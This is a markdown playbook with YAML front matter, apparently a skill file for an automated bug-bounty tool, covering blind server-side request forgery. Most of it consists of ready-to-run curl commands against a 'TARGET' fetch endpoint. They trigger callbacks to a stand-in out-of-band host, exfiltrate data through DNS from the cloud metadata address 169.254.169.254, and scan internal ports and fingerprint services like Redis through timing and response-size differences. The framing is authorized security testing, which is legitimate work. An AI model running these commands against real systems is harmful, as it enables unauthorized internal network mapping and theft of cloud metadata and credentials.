---
name: attack-ssrf-blind-oob
description: "Blind SSRF — OOB confirmation via Collaborator/interactsh, DNS exfiltration, timing oracles, response-latency port scanning"
category: "web-application"
version: "1.0"
author: "bountyreper-official"
tags:
  - ssrf
  - blind
  - oob
  - collaborator
  - timing
tech_stack:
  - web
cwe_ids:
  - CWE-918
chains_with:
  - attack-ssrf
  - attack-ssrf-filter-bypass
prerequisites:
  - attack-ssrf
---

# Blind SSRF

## Objective

The server fetches but never tells you. Confirm the fetch happened and turn it into a
read primitive via OOB callbacks, DNS exfiltration, or timing oracles.

> **Attribution:** Blind-SSRF methodology adapted from [KathanP19/HowToHunt — SSRF / Blind_SSRF](https://github.com/KathanP19/HowToHunt/tree/master/SSRF). Licensed GPL-3.0.

## Methodology

### 1. OOB confirmation (the default proof)

```bash
# Interactsh (default unless Burp explicitly mentioned) or Collaborator
attack_script ssrf_listener -p 8888 -o ssrf_evidence.json &
curl "https://TARGET/fetch?url=http://YOUR_OOB_HOST/ssrf-marker-N"
# DNS/HTTP hit = confirmed SSRF, tag tells you which input point
```

### 2. DNS exfiltration (read data out through the query string)

```bash
# Whatever the internal endpoint returns → encode into the DNS name you resolve
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/hostname.<role>.<uniq>.YOUR_OOB_HOST.net"
# the resolved label appears in your DNS log = data out
```

### 3. Timing oracle (when OOB egress is blocked)

```bash
# Open internal port: fetch waits/succeeds; closed: instant error
time curl -s "https://TARGET/fetch?url=http://127.0.0.1:22/"   # vs :33 random
# Repeat 3x per port; consistent delta ≈ open port
```

### 4. Latency-based internal port scan

```bash
for port in 22 80 443 3306 5432 6379 8080 9200 11211; do
  { time curl -s -o /dev/null "https://TARGET/fetch?url=http://127.0.0.1:$port/" ; } 2>&1 | grep real
done
# consistent +delta on specific ports = internal service map
```

### 5. Response-differential (blind content oracle)

```bash
# Different internal endpoints → different error text/time → infer service type
curl -s "https://TARGET/fetch?url=http://127.0.0.1:6379/" | wc -c   # Redis replies → longer body
curl -s "https://TARGET/fetch?url=http://127.0.0.1:22/"  | wc -c
```

## Evidence requirements (blind-specific)

- OOB: the DNS/HTTP hit log with timestamp + the exact request that triggered it
- Timing: repeatable delta table (port, three timings, baseline) — single sample dies in triage
- DNS exfil: your DNS log showing the resolved label containing the internal value

## Notes

- If OOB is blocked AND timing is noisy (CDN jitter), the finding is hard to prove —
  document both attempts; program may accept partial blind-SSRF evidence at medium
- Default OOB is Interactsh; use Collaborator only when explicitly mentioned
